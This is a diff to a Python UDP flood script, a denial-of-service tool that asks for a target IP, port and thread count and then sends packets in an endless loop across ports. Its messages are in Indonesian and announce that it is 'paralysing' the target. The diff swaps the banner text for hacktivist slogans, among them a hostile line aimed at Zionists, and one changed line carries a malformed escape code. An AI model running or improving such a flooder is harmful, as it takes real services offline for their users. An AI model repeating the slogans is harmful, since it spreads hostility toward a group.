@@ -63,17 +63,17 @@ ip = str(input("\033[94mTarget IP :  \033[0m"))
 port = int(input("\033[97mTarget Port :  \033[0m"))
 threads = int(input("\033[92mThreads :  \033[0m"))
 time.sleep(5),
-print("\033[33m  ⟩⟩  SCRIPT INI... \033[0m "),
+print("\033[33m  ⟩⟩  BASE ADALAH... \033[0m "),
 time.sleep(5),
-print("\033[32m  ⟩⟩  HANYA BOLEH KAU GUNAKAN \033[0m "),
+print("\033[32m  ⟩⟩  SEKUMPULAN PEJUANG \033[0m "),
 time.sleep(5),
-print("\033[91m  ⟩⟩  UNTUK MEMBERANTAS \033[0m "),
+print("\033[91m  ⟩⟩  YANG GERAM TERHADAP GENOSIDA \033[0m "),
 time.sleep(5),
-print("\033[98m  ⟩⟩  BAKTERI YG MERUGIKAN KEHIDUPAN \033[0m "),
+print("\033[98m  ⟩⟩  YANG DILAKUKAN BANGSA BAR-BAR \033[0m "),
 time.sleep(5),
-print("\033[96m  ⟩⟩  MERUSAK MORAL AGAMA & BANGSA \033[0m "),
+print("\033[96m  ⟩⟩  YANG MEMILIKI NAFSU MENGUASAI DUNIA \033[0m "),
 time.sleep(5),
-print("\033[95m  ⟩⟩  SERTA MEMBELA YG TERTINDAS..! \033[0m "),
+print("\033[95m  ⟩⟩  FUCK Z10N15..! \033[0m "),
 time.sleep(5),
 
 sent = 0
@@ -81,9 +81,9 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print(f"💥\033[97m[\033[32mBASE-3\033[97m]  \033[32mMengakses  \033[92mWebs::::.... " +ip+ "\033[0m" )
+     print(f"💥\033[97m[\033[32mBASE-3\033[97m]  \033[33mMengakses  \033[92mWebs::::.... " +ip+ "\033[0m" )
      print(f"💥\033[96m[\033[93mBASE-3\033[96m]  \033[95mMengirim  \033[96mPacket:::.... " +ip+ "\033[0m" )
      print(f"💥\033[95m[\033[96mBASE-3\033[95m]  \033[94mMengikis  \033[32mThread:::.... " +ip+ "\033[0m" )
-     print(f"💥\033[91m[\033[94mBASE-3\033[91m]  \033[97mMelumpuhkan \033[1mTarget:::.. " +ip+ "\033[0m" )
+     print(f"💥\033[91m[\033[94mBASE-3\033[91m]  \033[97mMelumpuhkan \094[1mTarget:::.. " +ip+ "\033[0m" )
      if port == 65534:
        port = 1
